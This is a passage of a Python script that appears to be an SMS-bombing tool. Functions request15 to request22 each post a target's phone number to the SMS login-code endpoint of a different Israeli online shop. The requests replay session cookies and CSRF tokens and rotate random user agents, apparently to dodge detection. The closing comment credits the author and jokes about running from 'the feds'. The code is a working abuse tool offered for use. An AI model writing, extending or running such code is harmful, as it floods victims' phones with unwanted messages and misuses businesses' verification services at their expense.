    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.shukh.co.il/frontend/check_phone'
    headers = {
        'Host': 'www.shukh.co.il',
        'Cookie': 'promo_modal=eyJpdiI6IkxtZW0zUGpHVDg1WEpDQmhua1VHR2c9PSIsInZhbHVlIjoiaGtObHVuOXVETXRENjZHL3Z6QlBtMUhCTmg5Nmk1VFBvOW9vUE9EMXFyVkdic3FpbkNjSjhXdGsvWUo2R2Q0YSIsIm1hYyI6ImRkNzc0MGZkNDlmZDc4ZTc4YjgwOGRlM2U0MDRkZmY3YTAzNWE1ZTNjNTIxZTI2MzdlMTJiNWYzYjBlZTI3MDIifQ%3D%3D; laravel_session=XHkgBCkAcxUCZONRRabCdNitox9EkgRYPx7MiI6l; wc_visitor=111201-8321d3af-fa2c-d6c8-32d2-90c96dce280f; wc_client=direct+..+none+..++..++..++..++..+https%3A%2F%2Fwww.shukh.co.il%2F+..+111201-8321d3af-fa2c-d6c8-32d2-90c96dce280f+..+; wc_client_current=direct+..+none+..++..++..++..++..+https%3A%2F%2Fwww.shukh.co.il%2F+..+111201-8321d3af-fa2c-d6c8-32d2-90c96dce280f+..+; _gcl_au=1.1.383956525.1710675874; _ga=GA1.1.925029598.1710675875; _fbp=fb.2.1710675874829.143740317; XSRF-TOKEN=eyJpdiI6IkRUYXhHdTIrSG1PNDJRYWdFblFDNkE9PSIsInZhbHVlIjoid1BHSG5Sb253c3lTNlp0QUt4VE5nemVMWU9NOEpvT0tBMW1pblpWd1pVNHN2b3VjbkRKN0YwSGViSUNJeThwVlJIbVNrUDVWOG5mVjhFMk9FbUZpRis2QXgrU1Z2TzRlQWE5cGJiN2tsRTN5Sm5KMkxzamFJcmk4ZUIwaFRRRmsiLCJtYWMiOiIwMGFjNzdjNTJkM2QwZDA1Y2Q4OGUyZTY4OTVhZjA4YzA1MGFlN2VmMmE4ODAxNGM4YzViZDcyMTA0OWQzMmFmIn0%3D; _ga_B6XGTRH7SR=GS1.1.1710675874.1.1.1710675885.0.0.0',
        'Content-Length': '104',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.shukh.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.shukh.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'YLCkM15upZaf7uN8v2NbLi4eFGYVNpggHPvlIkKP'
    }

    response = requests.post(url, headers=headers, data=data)

def request15(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.farmeat.co.il/frontend/check_phone'
    headers = {
        'Host': 'www.farmeat.co.il',
        'Cookie': 'promo_modal=eyJpdiI6Im5CRUxkU0ZLbHNlSUpUQnlzZ0VwQmc9PSIsInZhbHVlIjoiYWpuOTdzZVNFbjRGVDJYa1BCSDdhYzM5VXl5OC91WEIwTE14a29XOUNncHVjVjJ1dm8zcmdIR0ExY0VveisxRCIsIm1hYyI6ImUyY2UwYzA1MjcyYjJiNmUxMDA4ZDZjOGM3ZTBmNjEzN2RkYjJiMTUyM2UyZWE4M2ExOGEwODk3NDdmYmUxZjYifQ%3D%3D; laravel_session=Ni8jZ1mLvUE2F6E8ux55zYCNR9FbmGWGphFi0fUq; _gcl_au=1.1.2105158450.1710676023; _ga=GA1.1.1662437856.1710676023; _fbp=fb.2.1710676023631.2043280794; _tt_enable_cookie=1; _ttp=Mtd63EAA7PwpWO-P8XJUfRfBi30; XSRF-TOKEN=eyJpdiI6InczK0JkQjZ6eWRLZlJIcjR3NURMN1E9PSIsInZhbHVlIjoiWHl2N3NuQmd3ZDd4dGFVeWx2Y1ZnOEJRM3VoMTZPWmtxL1FvTkw0c2ZmNlJ3RDFmQXR6NmVIekNOblBndndKWWxTRlpJUWlMUFVDOTBSS3gyOWJYL3hmckpHWXVoYjJqQkZOZjVxS0VqTW1VY3FsczFTQWY3WENwNEN4cm9XeEkiLCJtYWMiOiI5MTUyMGY4MTE2MWQ3MzMwMjI2MTFkYTQ1YzVhM2Q2NmQwNDdmZmE5MzE5MDA4M2VlOTgzNmViNTY0ZDkyNDA1In0%3D; _ga_42GEEHDZ4X=GS1.1.1710676023.1.0.1710676037.0.0.0; _ga_HQLHD7E28G=GS1.1.1710676023.1.0.1710676037.0.0.0',
        'Content-Length': '104',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.farmeat.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.farmeat.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'CF118m2M2WtKQ4KIh6sDpa56u7M9uixMQv4peiyn'
    }

    response = requests.post(url, headers=headers, data=data)


def request16(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.refresh-market.co.il/frontend/check_phone'
    headers = {
        'Host': 'www.refresh-market.co.il',
        'Cookie': 'laravel_session=GfwxOX0UcZaZKaYFdhEXgbagsd49JriBkQcgaaC3; _ga=GA1.1.1162823440.1710676305; _fbp=fb.2.1710676305284.1064307175; XSRF-TOKEN=eyJpdiI6ImNEQy9DRi9UVjNRTVdMbWhZOVFEaVE9PSIsInZhbHVlIjoiSVJFOUdQRjh5cmkxVVFDZUdCWUlzZ2xrTW8rN2dmc2hlK3h4L2FuVUU1R2xYZEc0NmpQMEhha0d6TVhWb1hwdXl2WlBicHJPd2R2Z3MyUUZocmZST1RhZi80OUV5MnJTWmxlclA3SzRReHQyL28yWmxOZjZBWk5nRE90b24rbC8iLCJtYWMiOiIzMWNkNzM3ZjIyZDZlMTM3OTA4MDU1NWQ3NTUxNjViYmMwZjdmYzY0ZTJiMWM5ODljYTI5YWFkMDFjNDUwOTQyIn0%3D; _ga_TVLF8KVXG2=GS1.1.1710676304.1.1.1710676318.46.0.0',
        'Content-Length': '104',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.refresh-market.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.refresh-market.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': '0ztNc2wc69xwLnMNwdeSljLNiuna0lGz5aEkuYn0'
    }

    response = requests.post(url, headers=headers, data=data)


def request17(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.tohome.co.il/frontend/check_phone'
    headers = {
        'Host': 'www.tohome.co.il',
        'Cookie': 'promo_modal=eyJpdiI6InBQNExTQloyS2pUOXRXSXBxbm1qdHc9PSIsInZhbHVlIjoiVnBWbEYydThudkZWYkJLZmVkNzZCdE1Oak91bGtTWWx1REgxWkhXc2hadHd4OUR4L2JpcG15RzU5ZmVpZTNXMyIsIm1hYyI6IjJhZmYwYjk5YWY4Y2MzMWMyMjZhZmViYjRmZWQzYjdmZWMwOTE3MmRiMjc1ZGIyZWVjMDkzY2IxOGI2MzUzNGEifQ%3D%3D; laravel_session=IIYOe6poA3yJHaRGEe8jrWbn6icwDL9Q2CcYpGap; _fbp=fb.2.1710676693208.287070886; _ga=GA1.3.1199015216.1710676693; _gid=GA1.3.1495544911.1710676693; _gat_gtag_UA_159405629_1=1; XSRF-TOKEN=eyJpdiI6InZGZFV4SmYvM2s4b1RnUEVtdmhRdnc9PSIsInZhbHVlIjoiVW1xaVQ2NEoyNHFjN1k0M2VLcHYrNXJaWjBhclBLd0YvZXJkcTR4dU9tdVJQQXBNTldsWVZyR2FOT2h1RnBORjFyZnZlSWNqcXBJbm9WOWpTdWFEQ3hpc2ZJWjdxUGFubkZZdVA2eGQvdktnM3JHaEI0QzBRQUxlNW40M0N2aWUiLCJtYWMiOiIxOGY4MGE5NWRkNGZkY2EzODZiN2FkYTUzMmEyYzM0NTMwM2MwY2U5M2NlM2I4OWE5YTFlN2E5ZDg4NTNhMzk3In0%3D',
        'Content-Length': '104',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.tohome.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.tohome.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': '2Q2TRa1eBijearjm1ipYf6KllJpjjrPcmtwHe3ku'
    }

    response = requests.post(url, headers=headers, data=data)

def request18(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.salsila.co.il/frontend/check_phone'
    headers = {
        'Cookie': 'promo_modal=eyJpdiI6ImhqUGFTZnQvQmRKSkhVS1FITzBaa3c9PSIsInZhbHVlIjoiVXYwMzNhQ0FzbWFBL2dPNG0yQlVTTzY0aXlTRms4RFYwTEZRUUtZa2p1QzJKT2Z4dEtRVFpEeW15L1h3UTlMeiIsIm1hYyI6Ijg0YjBlY2JjODZiZmVkNTk1Yzc5M2NlY2VhYzZkZGU4ODJhMjczY2ViMjc1N2Q3Njc1NDhhZGFjZDAzYTBkMWMifQ%3D%3D; laravel_session=O2O7D46GU1Agih5xMwPGQEvfslN3y9b1UfNXkb6l; _fbp=fb.2.1710676826422.1017736158; XSRF-TOKEN=eyJpdiI6ImwvNExwcHkxdWZGeXVFdk5TbGc3ZFE9PSIsInZhbHVlIjoiNEU5TDdCWm9OK1dHSWdMRVZBZVhwamw1cFpHK3cxbWZoaWpabHFQVWRmQSswcHVWOTg1UlpDeDkveURLSFdHNVpzUU15VHQxbnNJQ2d1K1BmR2tsL1JwUVg5VkRnVWloOTVCT3llcEtORlRXNjcrbEpzYjBwZXpiZm1QQkZvRDEiLCJtYWMiOiI4NWIxMGY4MTcxNzQ4ZjQ4Zjg1MjJmZGJiNWNlMTU2NmIwZDI3ZGRkYThjYTcwODE3ODNjZmYxNzY0YmI4ZWFmIn0%3D',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.salsila.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.salsila.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'VkDI5m3ohNyDsKcEDQacOTScj9BexTtqf5pBtaht'
    }

    response = requests.post(url, headers=headers, data=data)

def request19(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.zinger-organic.com/frontend/check_phone'
    headers = {
        'Cookie': 'laravel_session=vMpuqk3A9qoBifOnrnYr4Itk4W3XmQjQ9tAEa9pm; _fbp=fb.1.1710677005602.580346154; _gid=GA1.2.1639336980.1710677006; _gat_gtag_UA_250034602_1=1; _ga=GA1.1.1872644976.1710677006; XSRF-TOKEN=eyJpdiI6IkdJeERHcHBkS0RaZDZ4YVBQSFRtTUE9PSIsInZhbHVlIjoidVIwcmdFZjlrQ2J6Z3ZFR3d6V2w4aDhmNmo4YWZ3dFYzOFZEUi9ocVNna3NQZWJvWjdteG0vZ3BKdjZOOThxVVM1RWo1VEpPZGY2WFNsazQ3dTFRb0orV2hBRGR6NTN3VzVPYysrUVMxOUQwcHJCWHE2NGxBNDlkU3Nvc3RMVkIiLCJtYWMiOiIxODA0M2E0OTU4Yzk1NjkwYjNiNmUzYzlhZWU0NTk3ODNmNzA2MmZkZTc5NjkwNmUxOWQ1MWNjZjk4NGIyMGMwIn0%3D; _ga_4QNQNYJ5J9=GS1.1.1710677005.1.0.1710677018.47.0.0',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.zinger-organic.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.zinger-organic.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'l2Pt7cQGbHZv9Fhm6x0wf1BwxEPsLNi8SG2NCqGC'
    }

    response = requests.post(url, headers=headers, data=data)

def request20(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.sadeyarok.co.il/frontend/check_phone'
    headers = {
        'Cookie': 'laravel_session=H40vNw194bJviXwGsmnVB2TOHnsGwH4kQypBHReA; _gcl_au=1.1.1218056914.1710677166; _gid=GA1.3.1598159117.1710677166; _gat_UA-191011188-1=1; _ga_J9T55YN7K5=GS1.1.1710677166.1.0.1710677166.60.0.0; _ga=GA1.1.803847093.1710677166; _fbp=fb.2.1710677166793.1662271564; XSRF-TOKEN=eyJpdiI6IlV1R1FPWkl5Q0wzSmpPZDJNaUdGREE9PSIsInZhbHVlIjoiUXZyUHpxMnp0Tk9XSXpOall0RzVXWGxBWUVoeU9yRjlkYi95V0NDTkF1a0dUWGtBMUMrYlZGUmJoV2h5bGpmV3BzVFVmOGV0c09UTWJTS0FaSHc3N0FBL3B1S0UySFlkaE9SaTBBZjZNYnB1dDd3NXVkUjhMNmxsTzJpYXpaZjYiLCJtYWMiOiI2OGU2OTUwNDkwYTFhOTM5MmE5MDcyZWJlZmIwZWJjNjA5NTkyZjYxNjY4YjhjNjliNzU4YWUwN2ZkZWY5YmI3In0%3D',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.sadeyarok.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.sadeyarok.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'SCtlF6b6WUTXuefIDcH6mYyR0RGw4g2Zw9C35oOo'
    }

    response = requests.post(url, headers=headers, data=data)

def request21(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.teva-shuk.co.il/frontend/check_phone'
    headers = {
        'Cookie': 'promo_modal=eyJpdiI6IkxtV3RLZ1FkemhlYW9HWk9VK0JHeVE9PSIsInZhbHVlIjoia3lMYnhqeHZtWXhqV0w2WVdYWHQxekFPdVlOamtOb0VnY0cxSUVCem5XQWVMM0tSN001TzJiTG5PM1ZaQjl0ViIsIm1hYyI6ImIzM2FlMzlmNzYwZmM1MTIyMTkyMWEzZDRhYTUxNWYyNTVhODMyODU3M2I0MGU4MDEwNTQ1NjM4MWE4YjkyODkifQ%3D%3D; laravel_session=oMCWTN50FG50v43EpYvXYjV7K1R314yoJfrM6WIR; _fbp=fb.2.1710677360738.1435949693; XSRF-TOKEN=eyJpdiI6ImNXU2VHbkM3MndMZkxKWFpRRHpvenc9PSIsInZhbHVlIjoiT1NyUENuaWJmZFEzeGlIZTdGTzhtTmtuUnZpV0x5RkJYaXhseWdLNEZsZ212MWlKTHdZTzVwT2RzSkdwYlRlb3VLM3FhNHBSWkcrZlU4ZHhMMGVDdThOSW5RRnZENU5TUVJaOUNIRm12Rnl4UGtjYnVtOWFLNEgzVzZKTXBFcGMiLCJtYWMiOiI5MWE0NjkwZThiOGFhZWMxZTdiZjU2NmY4YTc3ZDM1Njk1YzYwMzE4NjYwZDRiNmEwNzJjYTE1Mjg5M2Y2MGVjIn0%3D',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.teva-shuk.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.teva-shuk.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'DAetspl6UC2Jo9FQd54NH3NI5MwZzbqiWvnfVJEd'
    }

    response = requests.post(url, headers=headers, data=data)

def request22(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.shukherzel.co.il/frontend/check_phone'
    headers = {
        'Cookie': 'laravel_session=q3G67VaG6j8qUIZ1AceDOdQOFnoZnCMZgokByJCo; _fbp=fb.2.1710677490993.935821064; XSRF-TOKEN=eyJpdiI6IlBMVnR4K2kyWUVPZENMU2I0dUF1WGc9PSIsInZhbHVlIjoidGdYYVFYMDhLUXRXSkdtaDBnU1FPZzNDSnVOKzk3dFFUanRxekNvRS9HMnE3dVFQYkQ5K0ZZSjFLVVVuOTJzWHRsYzZWQVpNc0hTLzNzREhWSjVpNDRPRGI4RFR3Z0VIdGFZdEZ2RUdFMng5QjZqdC9xdXRPK2dieXhZb3NPTEQiLCJtYWMiOiIzNjI0MzAzN2M4MTYwZWU1ZDdlNmQ2Yzk5NjRlNDYxOGZiMmNhMDBiNDA0ZjZiYmEyYzQ2MWNiYWUxMWM5NTA0In0%3D',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.shukherzel.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.shukherzel.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'eYKKip33v2ku3t9FCFXo4TvgQmQLwGzVAPS7svIM'
    }

    response = requests.post(url, headers=headers, data=data)









intro()
main_menu()
#Coded and made by no1se. I think I've overdosed from requests, for real. Thanks to my friend, whom I can't name because the feds are all over him, for finding the last 10 websites.